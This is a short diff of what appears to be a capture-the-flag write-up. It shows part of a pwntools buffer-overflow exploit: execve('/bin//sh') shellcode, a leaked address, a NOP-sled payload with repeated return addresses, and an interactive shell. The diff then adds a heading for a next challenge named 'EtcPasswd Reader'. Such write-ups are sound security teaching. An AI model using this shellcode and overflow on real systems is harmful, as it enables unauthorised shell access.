@@ -65,16 +65,18 @@ sc = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\
 
 ru(b"address: ")
 leak = int(r(10), 16)
-print(hex(leak))
 tar = leak - 0x10
-print(hex(tar))
 
 payload = sc.rjust(1024, b"\x90")
 payload += p32(tar+8) * 10
-
-print(payload)
 
 sla(b"Enter]: ", payload)
 
 p.interactive()
 ```
+
+![image](https://github.com/user-attachments/assets/4856326e-f2e0-48ee-ae31-4c1bf492e4e5)
+
+## Pwn/EtcPasswd Reader
+
+### Initial Analysis
